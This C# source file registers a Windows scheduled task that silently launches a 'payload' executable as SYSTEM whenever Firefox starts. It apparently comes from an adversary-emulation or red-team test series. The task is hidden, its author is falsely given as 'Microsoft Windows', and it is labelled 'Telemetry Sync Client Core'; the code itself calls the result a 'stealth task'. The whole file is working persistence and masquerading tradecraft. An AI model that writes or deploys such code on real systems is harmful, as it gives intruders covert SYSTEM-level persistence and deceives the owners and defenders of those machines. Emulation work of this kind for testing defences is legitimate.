using System;
using System.IO;
using System.Runtime.InteropServices;

namespace A06_3b_event_trigger_schtask_persist
{
    class Program
    {
        static void Main(string[] args)
        {
            int milestone = 0;
            try
            {
                milestone = 1;
                string payloadPath = @"C:\Users\Public\A06_3b_SampleApp.exe";
                Console.WriteLine($"[*] Debug ({milestone}): Checking payload path: '{payloadPath}'...");

                if (!File.Exists(payloadPath))
                {
                    Console.WriteLine($"[-] PRE-REGISTRATION ERROR: Target payload binary was not found at '{payloadPath}'.");
                    return;
                }
                Console.WriteLine($"[+] Debug ({milestone}): Payload path verified on disk.");

                milestone = 2;
                Console.WriteLine($"[*] Debug ({milestone}): Fetching Type for Schedule.Service COM object...");
#pragma warning disable CA1416
                Type? taskSchedulerType = Type.GetTypeFromProgID("Schedule.Service");
#pragma warning restore CA1416
                if (taskSchedulerType == null)
                {
                    Console.WriteLine("[-] Could not find Schedule.Service COM object.");
                    return;
                }

                milestone = 3;
                Console.WriteLine($"[*] Debug ({milestone}): Instantiating TaskScheduler instance...");
                dynamic? ts = Activator.CreateInstance(taskSchedulerType);
                if (ts == null)
                {
                    Console.WriteLine("[-] Could not instantiate TaskScheduler instance.");
                    return;
                }

                milestone = 4;
                Console.WriteLine($"[*] Debug ({milestone}): Connecting to local Task Scheduler service...");
                ts.Connect();

                milestone = 5;
                Console.WriteLine($"[*] Debug ({milestone}): Fetching Root Folder pointer...");
                dynamic rootFolder = ts.GetFolder("\\");

                milestone = 6;
                Console.WriteLine($"[*] Debug ({milestone}): Attempting to purge any stale task definition instances...");
                try
                {
                    rootFolder.DeleteTask("A06_3b_EventTriggerTask", 0);
                    Console.WriteLine("    -> Stale task cleared successfully.");
                }
                catch (Exception)
                {
                    // Dynamically bound COM calls often throw generic TargetInvocationException 
                    // or base Exception objects if the task isn't found. Safe to ignore for a purge.
                    Console.WriteLine("    -> No stale task found. Proceeding cleanly.");
                }

                milestone = 7;
                Console.WriteLine($"[*] Debug ({milestone}): Allocating new Task Definition container...");
                dynamic taskDef = ts.NewTask(0);

                dynamic regInfo = taskDef.RegistrationInfo;
                regInfo.Author = "Microsoft Windows";
                regInfo.Description = "Telemetry Sync Client Core";

                milestone = 8;
                Console.WriteLine($"[*] Debug ({milestone}): Building Event Trigger and populating XML schema queries...");
                dynamic triggers = taskDef.Triggers;
                dynamic trigger = triggers.Create(0); // TASK_TRIGGER_EVENT = 0

                // CRITICAL FIX: Fixed structure to explicitly declare the Target path within the query meta parameters
                string subscriptionXml = @"<QueryList><Query Id='0' Target='Security'><Select Path='Security'>*[System[EventID=4688]] and *[EventData[Data[@Name='NewProcessName']='C:\Program Files\Mozilla Firefox\firefox.exe']]</Select></Query></QueryList>";

                trigger.Id = "FirefoxLaunchTrigger";
                trigger.Subscription = subscriptionXml;
                trigger.Enabled = true;

                milestone = 9;
                Console.WriteLine($"[*] Debug ({milestone}): Defining Executable Action routing configuration...");
                dynamic actions = taskDef.Actions;
                dynamic action = actions.Create(0); // TASK_ACTION_EXEC = 0
                action.Path = payloadPath;

                dynamic settings = taskDef.Settings;
                settings.DisallowStartIfOnBatteries = false;
                settings.StopIfGoingOnBatteries = false;
                settings.Hidden = true;

                milestone = 10;
                Console.WriteLine($"[*] Debug ({milestone}): Executing final task registration sequence via SYSTEM service token...");

                // CRITICAL FIX: Reverted back to explicit SYSTEM contexts with Service Account Logon permissions
                dynamic registeredTask = rootFolder.RegisterTaskDefinition(
                    "A06_3b_EventTriggerTask",
                    taskDef,
                    6,                             // TASK_CREATE_OR_UPDATE
                    "SYSTEM",                      // Run natively as SYSTEM 
                    Type.Missing,
                    5,                             // TASK_LOGON_SERVICE_ACCOUNT
                    Type.Missing
                );

                Console.WriteLine("[+] Successfully registered C# application-triggered stealth task!");
            }
            catch (COMException ex)
            {
                Console.WriteLine($"[-] COM Error caught at Milestone {milestone}: {ex.Message} (HRESULT: 0x{ex.HResult:X8})");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] General Error caught at Milestone {milestone}: {ex.Message}");
            }
        }
    }
}